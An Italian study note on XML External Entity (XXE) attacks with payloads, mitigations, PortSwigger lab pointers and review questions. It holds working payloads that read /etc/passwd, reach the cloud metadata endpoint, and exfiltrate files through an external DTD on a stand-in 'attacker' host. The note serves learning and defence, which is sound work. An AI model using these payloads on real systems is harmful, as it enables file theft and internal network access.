---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 3
aggiornato: 2026-07-02
stato: maturo
aliases: ["XML External Entity (XXE)", "XXE"]
---

# XML External Entity (XXE)

> **Nota etica**: praticare solo su lab autorizzati (PortSwigger Academy, DVWA, TryHackMe).

## In breve
La **XXE** sfrutta i parser XML che processano le **entità esterne** del DTD. Permette di **leggere file locali**, fare richieste interne (XXE→[[Server-Side Request Forgery (SSRF)]]), esfiltrare dati in blind e talvolta DoS o RCE. Categoria **A05** dell'[[OWASP Top 10]]. Bersagli tipici: API SOAP, upload di documenti (DOCX, SVG, XML), endpoint che accettano `Content-Type: application/xml`.

## Le entità XML
Il DTD può definire **entità** (variabili). Quelle **esterne** puntano a risorse fuori dal documento (`file://`, `http://`). Un parser che risolve il DTD senza restrizioni esegue quelle richieste con i privilegi del server.

## In-band — lettura file
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<ordine><prodotto>&xxe;</prodotto></ordine>
```
Se l'app riflette `<prodotto>` nella risposta → leggi `/etc/passwd`. Per file con caratteri che rompono l'XML, usa il wrapper PHP base64:
`SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"`.

## XXE → SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```
Il parser fa la richiesta interna → metadati cloud / servizi interni (vedi [[Server-Side Request Forgery (SSRF)]]).

## Blind XXE (out-of-band)
Nessun output in pagina → esfiltra via DNS/HTTP verso un tuo server (OAST), con un DTD esterno:
```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker/evil.dtd"> %ext; ]>
```
`evil.dtd` legge un file e lo accoda a un URL controllato:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval; %exfil;
```

## Mitigazione (priorità)
1. **Disabilitare DTD ed entità esterne** nel parser (difesa primaria):
   - Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - PHP: entity loader disabilitato di default da libxml 2.9 / PHP 8
   - .NET: `XmlReaderSettings.DtdProcessing = Prohibit`
2. Preferire **JSON** dove possibile; validare con **XSD** rigido.
3. Minimo privilegio sul processo di parsing; WAF come strato extra.

## Lab
- [[PortSwigger Web Academy]] → categoria **XML external entity (XXE) injection**. Percorso dal livello APPRENTICE:
  - *Exploiting XXE using external entities to retrieve files* — leggere `/etc/passwd` riflesso nella risposta.
  - *Exploiting XXE to perform SSRF attacks* — pivotare verso il metadata endpoint interno (ponte XXE→[[Server-Side Request Forgery (SSRF)]]).
  - *Blind XXE with out-of-band interaction* — esfiltrazione OAST via DTD esterno e **Burp Collaborator**.
  - *Exploiting XXE to retrieve data by repurposing a local DTD* — tecnica avanzata quando le entità esterne sono bloccate ma esiste un DTD locale.
- Cosa esercitare: intercettare un body `application/xml` con [[Burp Suite]], inserire il `<!DOCTYPE>` con l'entità e osservare il riflesso; per il blind, ospitare `evil.dtd` e leggere il canale Collaborator.

## Domande
1. **D:** Cos'è un'entità esterna XML e perché è pericolosa?  **R:** È una variabile definita nel DTD che punta a una risorsa fuori dal documento (`file://`, `http://`); un parser che la risolve senza restrizioni esegue la richiesta con i privilegi del server, permettendo lettura file e SSRF.
2. **D:** Come si legge un file che contiene caratteri che romperebbero l'XML?  **R:** Con il wrapper PHP `php://filter/convert.base64-encode/resource=/etc/passwd`, che restituisce il contenuto in base64 sicuro da riflettere.
3. **D:** Come funziona una XXE **blind** out-of-band?  **R:** Si carica un DTD esterno controllato che legge un file locale e lo accoda come parametro a un URL dell'attaccante, esfiltrando il dato via DNS/HTTP (OAST).
4. **D:** Qual è la mitigazione primaria contro la XXE?  **R:** Disabilitare DTD ed entità esterne nel parser (es. `disallow-doctype-decl` in Java, `DtdProcessing = Prohibit` in .NET), non affidarsi solo a filtri o WAF.
5. **D:** Quali formati/endpoint sono bersagli tipici di XXE?  **R:** API SOAP, upload di documenti che sono XML sotto il cofano (DOCX, SVG) e qualunque endpoint che accetta `Content-Type: application/xml`.

## Collegamenti
- [[OWASP Top 10]]
- [[Server-Side Request Forgery (SSRF)]]
- [[Security Misconfiguration]]
- [[HTTP e HTTPS]]
- [[Burp Suite]]
- [[PortSwigger Web Academy]]

## Fonti
- PortSwigger — XXE: https://portswigger.net/web-security/xxe
- OWASP — XXE Processing: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
- OWASP — XXE Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
